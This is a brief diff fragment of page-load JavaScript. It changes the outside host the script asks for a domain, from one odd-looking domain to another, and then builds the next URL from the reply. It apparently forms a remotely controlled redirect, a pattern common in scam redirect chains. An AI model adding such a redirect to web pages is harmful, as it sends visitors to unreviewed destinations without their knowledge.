@@ -1,6 +1,6 @@
 window.onload = function() {
     
-    fetch('https://u001.cyou/url.php')
+    fetch('https://ym001.icu/url.php')
         .then(response => response.text()) 
         .then(domain => {
             const nextUrl = 'https://' + domain.trim(); 
